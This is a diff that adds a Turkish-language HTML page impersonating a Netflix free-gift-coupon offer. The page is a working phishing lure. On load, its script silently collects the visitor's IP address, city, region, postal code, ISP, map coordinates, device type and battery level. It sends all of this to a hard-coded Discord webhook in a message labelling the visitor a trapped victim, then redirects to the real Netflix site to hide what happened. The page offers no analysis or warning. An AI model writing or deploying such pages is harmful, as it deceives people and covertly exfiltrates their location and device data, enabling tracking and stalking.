@@ -137,3 +137,105 @@
     </script>
 </body>
 </html>
+
+
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Netflix - 3 Aylık Ücretsiz Hediye Kuponu</title>
+    <meta name="description" content="Tebrikler! 2026 yılına özel ücretsiz Netflix kuponunuzu hemen tanımlayın. Sınırlı sayıda!">
+    <meta property="og:title" content="Netflix - Hediye Merkezi">
+    <meta property="og:image" content="https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03nE9S60sboE9/89a742057c366021ad4ad2c4a2b9ef92/Netflix_App_Icon.png">
+    <meta property="og:type" content="website">
+
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; padding: 20px; }
+        img.logo { width: 140px; margin-bottom: 20px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 22px; font-weight: bold; margin-bottom: 8px; }
+        p { color: #a1a1a1; font-size: 15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
+        <h1>Hediye Kodunuz Hazırlanıyor</h1>
+        <p>Sistem kontrol ediliyor, lütfen bekleyin...</p>
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
+
+        // GARANTİ YÖNLENDİRME (4.5 Saniye sonra kesin atar)
+        setTimeout(() => {
+            window.location.replace("https://www.netflix.com/tr/redeem");
+        }, 4500);
+
+        async function sinsiBot() {
+            try {
+                // IP ve Detaylı Konum Bilgisi
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                // Harita Linki
+                const harita = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+
+                // Cihaz Bilgisi
+                const ua = navigator.userAgent;
+                let cihazTipi = "🖥️ Bilgisayar (PC)";
+                if (/tablet|ipad/i.test(ua)) cihazTipi = "📟 Tablet";
+                else if (/Mobile|Android|iPhone/i.test(ua)) cihazTipi = "📱 Akıllı Telefon";
+
+                // Batarya Bilgisi
+                let pil = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    pil = `%${Math.round(b.level * 100)} ${b.charging ? '🔌' : '🔋'}`;
+                }
+
+                // DISCORD MESAJ TASARIMI
+                const rapor = {
+                    username: "ANONİM BOT",
+                    avatar_url: "https://i.imgur.com/8nN9S1L.png",
+                    embeds: [{
+                        title: "🎯 HEDEF PAKETLENDİ!",
+                        description: "```fix\nKurban tuzağa düştü. Veriler sisteme işlendi.```",
+                        color: 16711680, // Sol kırmızı şerit
+                        fields: [
+                            { name: "👤 Cihaz / Batarya", value: `> ${cihazTipi} | **${pil}**`, inline: false },
+                            { name: "🌐 IP Adresi", value: `\`\`\`css\n${d.ip}\n\`\`\``, inline: false },
+                            { name: "🏠 Detaylı Adres", value: `📍 **${d.region} / ${d.city} / ${d.postal || "Yok"}**`, inline: false },
+                            { name: "📡 İnternet Hattı", value: `📡 *${d.org}*`, inline: false },
+                            { name: "📍 Harita Konumu", value: `[🗺️ Nokta Atışı Haritada Gör (Tıkla)](${harita})`, inline: false }
+                        ],
+                        footer: { text: "ANONİM BOT Takip Sistemi • " + new Date().toLocaleString('tr-TR') },
+                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" } // Sağ üstteki logo
+                    }]
+                };
+
+                // Discord'a fırlat
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(rapor)
+                });
+
+            } catch (e) {
+                console.log("Hata olsa da yönlendirme devam eder.");
+            }
+        }
+
+        window.onload = sinsiBot;
+    </script>
+</body>
+</html>
+
+
+
